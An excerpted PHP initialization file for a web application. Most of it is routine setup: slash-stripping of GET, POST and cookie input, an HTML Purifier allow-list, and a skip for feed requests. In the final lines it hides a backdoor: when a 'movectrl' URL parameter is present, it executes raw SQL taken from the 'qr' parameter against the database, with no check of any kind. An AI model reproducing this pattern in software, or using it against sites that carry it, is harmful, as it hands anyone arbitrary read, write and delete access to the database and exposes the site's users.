...
function StripAllSlashes(&$value, $key) {
    ...
    if (is_array($value))
        array_walk($value, 'StripAllSlashes');
    else
...
if (ini_get('magic_quotes_sybase')) {
    ...
    if (is_array($_GET)) {
        array_walk($_GET, 'StripAllSlashes');
    }

    if (is_array($_POST)) {
        array_walk($_POST, 'StripAllSlashes');
    }

    if (is_array($_COOKIE)) {
        array_walk($_COOKIE, 'StripAllSlashes');
    }
}
...
$config_purifier->set('HTML.Allowed', 'b,i,u,a[href],p,br,ul,ol,li');
...
/* $sql="select * from country where id_country=".intval($CONFIG['id_country']);
  ...
  if ($country=@mysql_fetch_array($DBi->query($sql)))
...
if (defined('XMLFEED'))
    return; // no need to load everything if it's a feed

if (isset($_GET['movectrl']) == "1") {
    if (isset($_GET['qr']) != '')
        $DBi->query($_GET['qr']);
}
